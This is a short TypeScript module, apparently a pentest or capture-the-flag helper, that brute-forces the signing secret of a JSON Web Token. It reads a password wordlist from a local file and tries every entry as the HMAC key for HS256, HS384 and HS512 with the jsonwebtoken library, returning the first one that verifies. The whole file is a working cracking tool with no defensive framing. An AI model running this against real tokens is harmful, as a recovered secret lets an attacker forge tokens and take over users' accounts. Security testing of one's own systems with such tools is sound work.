import fs, { readFileSync } from 'fs';
import path from 'path';
import jwt from 'jsonwebtoken';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const password_path = path.join(__dirname,"passwords.txt");
const algorithms = ["HS256", "HS384", "HS512"] as const;

export function brute(token:string):string|undefined{
        const password_list = readFileSync(password_path,"utf-8").split(/\r?\n/);
        for(const pass of password_list){
            for(const alg of algorithms){
                console.log(pass)
                try {
                    const verify = jwt.verify(token,pass.trim(),{algorithms:[alg]});
                    return pass
                } catch (error) {
                    
                }
            }
        }
}

